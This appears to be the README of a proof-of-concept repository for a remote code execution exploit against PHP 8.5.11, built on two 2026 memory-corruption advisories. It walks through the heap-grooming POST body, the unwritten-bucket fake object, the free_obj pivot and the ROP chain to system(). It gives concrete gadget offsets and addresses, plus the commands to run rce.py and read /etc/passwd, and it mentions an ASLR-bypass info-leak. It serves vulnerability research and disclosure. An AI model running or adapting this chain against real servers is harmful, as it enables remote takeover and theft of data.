# actual-php2shell

A reproducible, application-independent remote code execution PoC against PHP
8.5.11 (the October 2026 advisories). It turns the two 2026 PHP memory-corruption
advisories into `system("cat /etc/passwd")` with **no application code** — the
victim's `index.php` just echoes `ok`.

- **CVE-2026-109618** — OOM `longjmp` abandons a half-built `HashTable`, leaving
  a dangling bucket that shutdown destroys. **This is the RCE primitive.**
- **CVE-2026-109619** — request-owned error state (the fatal-error backtrace)
  survives request shutdown and is re-freed by the next request. **This is the
  info-leak / ASLR-bypass primitive** (a separate demo here).

Everything is fully reproducible in Podman containers. The confirmed end-to-end
result is `./exploits/cve-2026-109618-oom/rce.py` reading `/etc/passwd`.

---

## 1. The vulnerability (CVE-2026-109618)

When PHP runs out of memory it calls `zend_mm_safe_error()` →
`zend_error_noreturn()` → `zend_bailout()` (`longjmp`). In 8.5.11 the hash-table
insert is **not** allocation-fallible, so an OOM can unwind with a `HashTable`
half-modified.

The corrupting site is `_zend_hash_str_add_or_update_i()`'s `add_to_hash`
(`Zend/zend_hash.c:960`):

```c
add_to_hash:
    idx = ht->nNumUsed++;                       /* (1) bumped first      */
    ht->nNumOfElements++;                       /* (2) bumped            */
    p = ht->arData + idx;
    p->key = key = zend_string_init(str, len);  /* (3) OOM -> zend_bailout */
```

If the key copy `zend_string_init` OOMs, the bucket `p` is left **unwritten**
(`key`/`h`/`val` all stale) but `nNumUsed` is already incremented. At request
shutdown `zend_array_destroy()` walks `nNumUsed` buckets and calls
`i_zval_ptr_dtor(&p->val)` on the unwritten bucket's garbage `val` — an
attacker-shaped value. The 8.5.12 fix replaces every such allocation with
fallible variants (`femalloc`/`fperealloc2` + `HASH_FALLIBLE`) so the insert
returns cleanly instead of bailing out.

## 2. The object-graph / heap-feng-shui balance

The exploit is entirely about getting **one controlled 2560-byte block** to be
the `arData` of the `HashTable` whose last bucket is the OOM bucket. The values
that had to be balanced, and why:

| Type / variable | Size | Role |
|---|---|---|
| `zend_array` (`HashTable`) header | 56 B | `arData`, `nNumUsed`, `nTableSize`, `pDestructor` |
| `Bucket` | 32 B | `val`(16) + `h`(8) + `key`(8); the unwritten one is our target |
| `zval` | 16 B | `value`(8) + `u1.type_info`(4) + `u2`(4) — we set `type_info` |
| `zend_string` | 24 B header + data | the pad value; its length picks the allocator bin |
| `zend_object` | 56 B | fake object: `gc`(8) `handle`(4) `ce`(8) `handlers`(8) `properties`(8) |
| `zend_object_handlers` | `offset`/`free_obj`/`dtor_obj` | `free_obj` is the pivot gadget |
| `zend_mm_heap` / `zend_mm_chunk` | — | `free_slot[]`, `free_tail`, `map[]` (bin 28 = 2560 B) |

The two allocator facts that the whole feng-shui turns on:

1. **The arData of a 64-bucket table is exactly 2560 bytes = bin 28**
   (`HT_SIZE_EX(64) = 64*32 buckets + 128*4 hash = 2560`), because
   `HT_SIZE_TO_MASK(n) = -(2n)`.
2. **`b150` (walked) and `b0e0` (discarded) are two copies of `$_POST["a"]`**
   created by the symtable `SEPARATE_ARRAY`/indirect path; each
   `a[<large>][c]=v` field inserts the `<large>` key into *both*, and `b0e0` is
   always 1 key ahead. Only `b150` is destroyed by `php_request_shutdown`, so
   the OOM must land on `b150`.

## 3. The full chain (see `rce.py`)

The request body is a urlencoded POST:

```
memshift=<40 KB of M>&
a[X…0000000000000000][c]=v&  … (30 fields)
pad=<crafted 2528 B>&
pad=x&
a[X…0000000000000030][c]=v&  … (fields 30..59)
```

1. **`memshift` (~40 KB)** consumes just enough memory that the OOM fires on the
   *first* insert of the OOM field, i.e. into **`b150`** (the walked table), not
   the discarded `b0e0`.
2. **`pad=<2528 B>`**: `add_post_var` does `estrndup(A)` then
   `ZVAL_STRINGL_FAST(B, copy)`. Measured `B = padlen + 32`, so `padlen=2528`
   gives `A = 2529` and `B = 2560` — **both bin 28**. `A` is freed by the
   `estrndup` path.
3. **`pad=x` (duplicate key)** DTORs the retained copy `B`, freeing a *second,
   distinct* bin-28 slot. Now `b150`'s 32→64 resize reuses `B` — our controlled
   bytes become `b150`'s `arData`.
4. The pad bytes place the payload in the **controlled tail** of the arData
   (buckets 46–63, raw offset ≥ 1984) — *not* at offset 0x100, which is the hash
   array rewritten by `zend_hash_rehash`.
5. The **unwritten bucket** (raw offset 1952 = pad offset 1928) is set to
   `IS_OBJECT` with `value.obj = &fake_object`.
6. Shutdown walks it: `i_zval_ptr_dtor` → `rc_dtor_func` →
   `zend_objects_store_del` → `handlers->free_obj` = pivot → ROP →
   `system("cat /etc/passwd > /var/www/html/leak.txt")`; a follow-up
   `GET /leak.txt` returns the file.

Two subtle requirements that cost real debugging time (both in `rce.py`):

- The fake object/ROP must sit in the arData **tail**; pad offset 0x100 is the
  hash array and gets overwritten.
- `__libc_system` uses `movaps` (16-byte-aligned), so an extra `ret` gadget is
  inserted between `pop rdi; ret` and `system` — otherwise it SIGSEGVs inside
  `__libc_system` before `execve`.

## 4. Addresses targeted (ASLR off, `setarch -R`)

Measured against `php-rce-oom-debug:8.5.11` (base `php-rce-base:8.5.11`). The
libphp/libc bases are the same across the base build; the heap offset `B` shifts
with installed libs (gdb install moved it), so re-measure `B` for a different
image, or resolve it via the info-leak for ASLR-on.

| Symbol | Address |
|---|---|
| libphp base | `0x7ffff4400000` |
| libc base | `0x7ffff7cd4000` |
| `system` | `0x7ffff7d20490` (libc+`0x4c490`) |
| `pop rdi; ret` | `0x7ffff7cfb7e5` (libc+`0x277e5`) |
| `ret` | `0x7ffff7cfb7e6` |
| pivot (`jump_fcontext+0x2e`) | `0x7ffff49fb8ae` |
| main chunk (`[anon:zend_alloc]`) | `0x7ffff7200000` |
| `B` (arData raw block = `b150->arData - 512`) | `0x7ffff725e400` |
| fake handlers | `B + 24 + 2000` = `0x7ffff725ebe8` |
| fake object | `B + 24 + 2048` = `0x7ffff725ec18` |
| `cmd` string | `B + 24 + 2200` = `0x7ffff725ecb0` |

The ROP chain (relative to the fake object, `o`):

```
o+0x40  pop rdi; ret     (r8 loaded by the pivot)
o+0x48  &cmd             (rdi)
o+0x50  ret              (stack alignment for movaps)
o+0x58  system
```

## 5. Reproduce

Requires Podman. From the repo root:

```bash
# build base + OOM + debug (gdb) images
./exploits/cve-2026-109618-oom/trace.sh build

# run the vulnerable worker with ASLR disabled (setarch -R), port 8084
./exploits/cve-2026-109618-oom/trace.sh up

# exploit: OOM -> free_obj hijack -> system("cat /etc/passwd")
python3 exploits/cve-2026-109618-oom/rce.py 127.0.0.1 8084
```

Expected output:

```
[+] RCE: read /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
…
```

### Other demos

```bash
# stale fatal-backtrace UAF crash (CVE-2026-109619)
./exploits/cve-2026-109619-stale-state/run.sh up && ./exploits/cve-2026-109619-stale-state/run.sh uaf

# info-leak / ASLR-bypass primitive (addresses + read path)
./exploits/cve-2026-109619-info-leak/run.sh build && ./exploits/cve-2026-109619-info-leak/run.sh up && ./exploits/cve-2026-109619-info-leak/run.sh leak

# negative control (patched 8.5.12 survives the same sequence)
./exploits/negative-control/run.sh up && ./exploits/negative-control/run.sh
```

## 6. Repo layout

```
affected-versions/          vendored vulnerable PHP tarballs (8.2.34/8.3.35/8.4.26/8.5.11)
patched-versions/           vendored patched 8.5.12 tarball (negative control)
references/                 the two GHSA advisories + the 2004 Esser advisory + php-bug-78876
container/
  base/                     shared Apache 2.4 + PHP build (parameterized by version)
  cve-2026-109618-oom/      OOM victim (memory_limit=8M) + gdb debug layer
  cve-2026-109619-stale-state/   stale-backtrace UAF victim + gdb debug layer
  cve-2026-109619-info-leak/     info-leak / ASLR-bypass victim
  negative-control/         patched 8.5.12, same config
exploits/
  lib/client.py             raw-socket HTTP client (controlled framing)
  cve-2026-109618-oom/      exploit.py (trigger), stalealias.py, rce.py, trace.py/trace.sh
  cve-2026-109619-stale-state/   producer/consumer/exploit/rop/leak + run.sh + trace.sh
  cve-2026-109619-info-leak/     leak.py + run.sh
  negative-control/
docs/
  attack-surface.md         exact vulnerable source locations
  memory-layout.md          measured object graph + ROP + addresses
  heap-feng-shui.md         the grooming progress log (§8.8–8.16 is the RCE chain)
  info-leak.md              the info-leak / ASLR-bypass primitive
  exploit-plan.md / implementation-plan.md / tasks.md
```

## 7. Scope / caveats

- This is a **PoC with ASLR disabled** (`setarch -R`) so the addresses are fixed.
  For ASLR-on the heap base and module bases must come from the
  `cve-2026-109619-info-leak` primitive (`docs/info-leak.md`).
- The `B` offset is image-dependent (installed libs shift the heap); re-measure
  `B = b150->arData - 512` with the gdb tracer for a different image.
- The victim is application-independent: `index.php` does no filesystem I/O and
  is not involved in the exploit.
- Full findings and the step-by-step allocator reasoning are in `docs/`.
